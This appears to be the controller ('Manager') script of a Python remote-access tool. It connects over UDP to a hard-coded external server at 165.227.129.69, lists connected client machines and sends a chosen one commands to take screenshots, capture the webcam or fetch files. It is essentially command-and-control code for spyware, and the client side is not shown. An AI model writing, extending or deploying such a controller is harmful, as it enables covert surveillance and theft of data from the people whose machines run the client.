import socket
import threading
import os

######################################
######### GLOBAL VARIABLES ###########
######################################

alias = 'Manager'

server_address = '165.227.129.69'
server_port = 8008
server = server_address, server_port

client_address = ''
client_port = 0
selected_client = ()

######################################
############# FUNCTIONS ##############
######################################

clear = lambda: os.system('cls')

def receive():
  while True:
    data = manager_socket.recv(1024)
    print(data.decode('utf-8'))

######################################
############# EXECUTION ##############
######################################

manager_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
manager_socket.bind(('', 0))
manager_socket.sendto((f'{alias} connected to server').encode('utf-8'), server)

thread = threading.Thread(target=receive)
thread.start()

while True:
  key = input('\tChoose an action:'
              '\n1 - Show client list'
              '\n2 - Select a client'
              '\n3 - Send to a client'
              '\n4 - Disconnect\n-> ')
  match key:
    case '1':
      manager_socket.sendto(('show client list').encode('utf-8'), server)
    case '2':
      client_address = input('Enter client address\n->')
      client_port = int(input('Enter client port\n->'))
      manager_socket.sendto((f'select a client: {client_address} {client_port}').encode('utf-8'), server)
    case '3':
      command = input('\tCommand:'
              '\n1) S - Screenshot'
              '\n2) W - Webcam'
              '\n3) F - Files\n -> ')
      selected_client = client_address, client_port
      manager_socket.sendto(f'{command}'.encode(), selected_client)
    case '4':
      manager_socket.close()
    case _:
      pass


#while True:

